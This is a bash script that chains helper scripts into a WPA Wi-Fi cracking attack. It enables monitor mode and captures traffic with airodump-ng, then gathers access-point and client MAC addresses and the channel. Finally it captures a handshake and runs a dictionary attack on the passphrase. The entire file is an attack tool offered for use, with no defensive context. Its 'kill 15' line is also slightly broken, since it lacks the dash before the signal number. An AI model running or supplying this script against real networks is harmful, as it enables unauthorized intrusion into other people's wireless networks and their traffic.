#!/bin/bash

./get_interface.sh
INTERFACE=`cat dumpfiles/interface.txt`

./monitor_mode.sh $INTERFACE

x-terminal-emulator -e "airodump-ng -w dumpfiles/dump $INTERFACE" &
echo "Please wait, creating dumpfile..."
sleep 5

# Finds PID of airodump-ng and kills it
TEMPPID=`ps -ef | grep "\bairodump-ng -w dumpfiles/dump $INTERFACE\b" | awk '{print $2}'`
kill 15 $TEMPPID

./get_ap.sh
APMAC=`cat dumpfiles/ap.txt`

./get_cl.sh
CLMAC=`cat dumpfiles/cl.txt`

./obtain_ch.sh $APMAC
CH=`cat dumpfiles/ch.txt`

./create_psk.sh
PSKFILE=`cat dumpfiles/psk.txt`

./get_wpa.sh $APMAC $CLMAC $CH $PSKFILE $INTERFACE

./dictionary.sh $APMAC $PSKFILE

